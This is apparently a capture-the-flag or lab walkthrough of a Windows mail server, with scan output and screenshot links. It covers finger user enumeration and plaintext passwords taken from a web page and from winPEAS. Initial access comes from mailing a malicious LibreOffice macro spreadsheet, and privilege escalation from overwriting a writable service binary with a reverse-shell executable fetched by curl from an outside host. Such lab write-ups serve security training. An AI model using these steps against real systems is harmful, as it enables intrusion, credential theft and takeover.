<img width="1252" height="210" alt="image" src="https://github.com/user-attachments/assets/9e039fd3-4a78-416a-a0aa-ea891ce554b4" />25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
| smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME, SIZE 0, HELP
|_ Recognized SMTP commands are: HELO EHLO MAIL RCPT DATA RSET AUTH NOOP QUIT HELP VRFY SOML Mail server account is 'Maiser'.
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
|_pop3-capabilities: APOP UIDL USER EXPIRE(NEVER) TOP
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: IMAP4rev1 X-MERCURY-1A0001 OK complete AUTH=PLAIN CAPABILITY
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| tls-alpn: 
|_  http/1.1
|_http-title: Time Travel Company Page
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Mercury HTTP Services
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-title: Time Travel Company Page
11100/tcp open  vnc            VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    Unknown security type (40)
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
33006/tcp open  mysql          MariaDB 10.3.24 or later (unauthorized)
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC

port 443 time travel company
<img width="1277" height="515" alt="image" src="https://github.com/user-attachments/assets/1bd5e34d-a070-4c85-a784-e9ecd75a6fe2" />
jonas:SicMundusCreatusEst  looks v sus
<img width="919" height="764" alt="image" src="https://github.com/user-attachments/assets/c4523d7b-1806-4c6b-987a-d8c2ddf46abf" />

port 2224 mercury services
<img width="1147" height="450" alt="image" src="https://github.com/user-attachments/assets/4750d7c1-1de2-463a-bff5-183761e1c31d" />

port 79 fingers
perl ~/tools/finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t $ip | grep -v "is not known"
<img width="928" height="153" alt="image" src="https://github.com/user-attachments/assets/f926a268-b1f5-49c1-bdeb-bf67830ca463" />
admin
agnes
charlotte
jonas
magnus
martha
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC 

port 110
using jonas 
<img width="433" height="151" alt="image" src="https://github.com/user-attachments/assets/f3e6565e-2cff-414f-8abd-326f46d899ed" />

agnes message
If you can please send to mailadmin the spreadsheet for printing with all the company contacts will be really apreciated .
Ela, can you install the office suite on my machine?

msg 3
using libre office all the spreadsheets and docs wil be processed in mail server first. so potential macro..?

since spreadsheet, we create a ods file
https://github.com/0bfxgh0st/MMG-LO/
<img width="484" height="127" alt="image" src="https://github.com/user-attachments/assets/484adf9b-b859-4fc2-99a8-19faee50d48e" />

after that i send the mail to mailadmin@localhost
<img width="1505" height="405" alt="image" src="https://github.com/user-attachments/assets/80652d85-8a6e-4524-a85c-208118a278af" />
returned shell as ela
<img width="1252" height="210" alt="image" src="https://github.com/user-attachments/assets/3f65bf64-dc96-4859-a50d-df240ea8b2c6" />

winpeas
DefaultUserName               :  Ela Arwel
    DefaultPassword               :  LadderWheelGallon443
VeyonService(Veyon Solutions - Veyon Service)[C:\Users\Ela Arwel\Veyon\veyon-service.exe] - Auto - Running - No quotes and Space detected
    File Permissions: Ela Arwel [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Users\Ela Arwel\Veyon (Ela Arwel [Allow: AllAccess])

https://www.exploit-db.com/exploits/48246
wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "C:\Windows\\" |findstr /i /v """
Veyon Service                                                                       VeyonService                              C:\Users\Ela Arwel\Veyon\veyon-service.exe   
veyon is actually run by ela
so we can modify it
curl http://192.168.45.184/reverse.exe -o C:\Users\Ela Arwel\Veyon\veyon-service.exe

move the files to bak. and download the msfvenom shell then move it there
<img width="720" height="101" alt="image" src="https://github.com/user-attachments/assets/6d4f31bf-cc83-4415-9ad7-21e3ca662e0c" />
shutdown /r /t 0
<img width="315" height="103" alt="image" src="https://github.com/user-attachments/assets/2aaf4ae1-045a-4d62-a491-c0c6fc38e54e" />
